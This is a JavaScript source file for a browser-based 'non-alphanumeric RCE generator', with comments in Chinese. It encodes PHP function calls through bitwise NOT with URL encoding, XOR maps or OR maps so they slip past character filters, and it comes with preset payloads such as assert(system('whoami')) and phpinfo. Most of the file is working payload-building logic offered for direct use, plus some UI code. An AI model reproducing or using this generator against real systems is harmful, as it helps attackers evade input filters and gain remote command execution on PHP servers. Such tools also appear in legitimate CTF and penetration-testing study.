// 无字母数字 RCE 生成器（纯前端 JS）
// 功能：
// - (~) 按位取反 + URL 编码
// - (^) XOR 映射拼接
// - (|) OR  映射拼接
// 完全在浏览器内运行，无需后端

(function(){
  const $ = (sel)=>document.querySelector(sel);
  const methodSel = $('#method');
  const funcInput = $('#funcInput');
  const paramInput = $('#paramInput');
  const autoSemicolon = $('#autoSemicolon');
  const output = $('#output');
  const themeToggle = $('#themeToggle');
  const paramHint = $('#paramHint');
  const funcLen = $('#funcLen');
  const paramLen = $('#paramLen');
  const payloadLen = $('#payloadLen');
  const toastElement = $('#toast');

  // PHP 按位取反（~）对字节的行为：逐字节取反（0xFF - b）
  function phpBitwiseNotBytes(str){
    const bytes = Array.from(new TextEncoder().encode(str));
    const inverted = bytes.map(b => (~b) & 0xFF);
    return inverted; // 返回数组 [0..255]
  }

  // URL 编码为 %XX（大写）
  function toPercentHex(bytes){
    return bytes.map(b => '%' + b.toString(16).toUpperCase().padStart(2,'0')).join('');
  }

  // (~) 方案： ( ~%..%.. )(); 或 ( ~%.. ) ( ~%.. );
  function buildNotUrlencode(func, param, addSemi){
    // 函数与参数分别取反并转 %XX
    const f = toPercentHex(phpBitwiseNotBytes(func));
    const p = toPercentHex(phpBitwiseNotBytes(param));
    const suffix = addSemi ? ';' : '';
    // 与原 PHP 示例对齐
    // echo "(~" . urlencode(~$func) . ")" . "(~" . urlencode(~$params) . ");";
  // 若参数为空，应输出空括号 ()，而不是 (~)
  const right = (param && param.length > 0) ? `(~${p})` : `()`;
  return `(~${f})${right}${suffix}`;
  }

  // 生成 XOR 映射：将 ASCII 可见字符 (32..126) 映射到 "'%xx'^'%yy'"
  function buildXorMap(){
    const map = {};
    for(let x=128;x<=255;x++){
      for(let y=x;y<=255;y++){
        const r = (x ^ y) & 0xFF;
        if(r>=32 && r<=126){
          const ch = String.fromCharCode(r);
          // 与 PHP dechex 一致，小写 16 进制，不补 0（但常见 URL 需要两位，这里忠实还原）
          map[ch] = `'${toPct(x)}'^'${toPct(y)}'`;
        }
      }
    }
    return map;
  }

  // 生成 OR 映射：将 ASCII 可见字符 (32..126) 映射到 "'%xx'|'%yy'"
  function buildOrMap(){
    const map = {};
    for(let x=32;x<=126;x++){
      for(let y=32;y<=126;y++){
        const r = (x | y) & 0xFF;
        if(r>=32 && r<=126){
          const ch = String.fromCharCode(r);
          map[ch] = `'${toPct(x)}'|'${toPct(y)}'`;
        }
      }
    }
    return map;
  }

  // 将字节转为 %hex（小写、不补零与 PHP dechex 保持一致）
  function toPct(n){
    return '%' + n.toString(16);
  }

  function replaceByMap(str, map){
    let out = '';
    for(const ch of str){
      if(map[ch]){
        out += `(${map[ch]}).`;
      }else{
        out += ch; // 若无映射，按原字符输出（与参考脚本一致）
      }
    }
    return out.endsWith('.') ? out.slice(0, -1) : out;
  }

  function buildXorPayload(func, param, addSemi){
    const map = buildXorMap();
    const ef = replaceByMap(func, map);
    const ep = replaceByMap(param, map);
    return `(${ef})(${ep})${addSemi?';':''}`;
  }

  function buildOrPayload(func, param, addSemi){
    const map = buildOrMap();
    const ef = replaceByMap(func, map);
    const ep = replaceByMap(param, map);
    return `(${ef})(${ep})${addSemi?';':''}`;
  }

  function build(){
    const method = methodSel.value;
    const func = funcInput.value || '';
    const param = paramInput.value || '';
    const addSemi = !!autoSemicolon.checked;

    let payload = '';
    if(method === 'not'){
      payload = buildNotUrlencode(func, param, addSemi);
    }else if(method === 'xor'){
      payload = buildXorPayload(func, param, addSemi);
    }else if(method === 'or'){
      payload = buildOrPayload(func, param, addSemi);
    }
    output.value = payload;

    // UI meta
    funcLen.textContent = String(func.length);
    paramLen.textContent = String(param.length);
    payloadLen.textContent = String(payload.length);
    // param hint
    if(method === 'not' && param.trim().length === 0){
      paramHint.classList.remove('hidden');
    }else{
      paramHint.classList.add('hidden');
    }
    autoResizeOutput();
  }

  // 复制
  function copyOut(){
    if(!output.value){ return; }
    navigator.clipboard?.writeText(output.value).then(()=>{
      toast('已复制', 'success');
    }).catch(()=>{
      // 兜底：选中文本
      output.focus();
      output.select();
      toast('已选中，请手动复制');
    });
  }

  // 简易提示
  function toast(msg, type = 'info'){
    toastElement.textContent = msg;
    toastElement.className = 'toast show';
    
    if (type === 'success') {
      toastElement.style.borderColor = 'var(--success)';
    }
    
    setTimeout(()=>{
      toastElement.classList.remove('show');
      setTimeout(()=>{
        toastElement.className = 'toast';
      }, 250);
    }, 2000);
  }

  // 示例
  function bindExamples(){
    document.querySelectorAll('.examples-list button').forEach(btn=>{
      btn.addEventListener('click', ()=>{
        const id = btn.getAttribute('data-example');
        switch(id){
          case 'not-phpinfo':
            methodSel.value = 'not';
            funcInput.value = 'phpinfo';
            paramInput.value = '';
            autoSemicolon.checked = false;
            break;
          case 'not-assert-whoami':
            methodSel.value = 'not';
            funcInput.value = 'assert';
            paramInput.value = "system('whoami')";
            autoSemicolon.checked = true;
            break;
          case 'xor-assert-whoami':
            methodSel.value = 'xor';
            funcInput.value = 'assert';
            paramInput.value = "system('whoami')";
            autoSemicolon.checked = true;
            break;
          case 'or-assert-phpinfo':
            methodSel.value = 'or';
            funcInput.value = 'assert';
            paramInput.value = 'phpinfo();';
            autoSemicolon.checked = true;
            break;
        }
        build();
      });
    });
  }

  // 事件
  $('#genBtn').addEventListener('click', build);
  $('#copyBtn').addEventListener('click', copyOut);
  $('#copyBtn2').addEventListener('click', copyOut); // 新增的复制按钮
  $('#clearBtn').addEventListener('click', ()=>{
    funcInput.value = '';
    paramInput.value = '';
    build();
    funcInput.focus();
  });
  [methodSel, funcInput, paramInput, autoSemicolon].forEach(el=>{
    el.addEventListener('change', build);
    el.addEventListener('input', build);
  });

  // 主题切换
  themeToggle.addEventListener('click', ()=>{
    const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
    document.documentElement.setAttribute('data-theme', isDark ? 'light' : 'dark');
    localStorage.setItem('theme', isDark ? 'light' : 'dark');
    themeToggle.textContent = isDark ? '🌕 主题' : '🌑 主题';
  });

  // 初始主题
  (function(){
    const stored = localStorage.getItem('theme');
    if(stored){
      document.documentElement.setAttribute('data-theme', stored);
      themeToggle.textContent = stored === 'dark' ? '🌕 主题' : '🌑 主题';
    }else{
      const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
      document.documentElement.setAttribute('data-theme', prefersDark ? 'dark' : 'light');
      themeToggle.textContent = prefersDark ? '🌕 主题' : '🌑 主题';
    }
  })();

  function autoResizeOutput(){
    output.style.height = 'auto';
    output.style.height = Math.min(output.scrollHeight, 600) + 'px';
  }

  // 初始
  bindExamples();
  // 默认：勾选末尾分号
  autoSemicolon.checked = true;
  build();
  autoResizeOutput();
  
  // 添加输入框焦点样式
  [funcInput, paramInput].forEach(input => {
    input.addEventListener('focus', () => {
      input.parentElement.classList.add('focused');
    });
    
    input.addEventListener('blur', () => {
      input.parentElement.classList.remove('focused');
    });
  });
})();